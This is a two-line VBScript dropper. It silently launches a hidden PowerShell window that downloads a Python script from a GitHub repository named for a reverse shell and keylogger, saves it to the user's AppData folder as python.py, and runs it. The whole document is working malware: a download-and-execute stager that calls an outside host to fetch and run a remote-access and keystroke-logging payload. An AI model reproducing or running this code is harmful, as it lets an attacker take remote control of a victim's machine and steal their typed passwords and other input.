Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -NoExit -c ""iwr https://raw.githubusercontent.com/Caaki/ReverseShell-Keyloging/main/clientV6.py -outfile $env:APPDATA\python.py; python $env:APPDATA\python.py""", 0
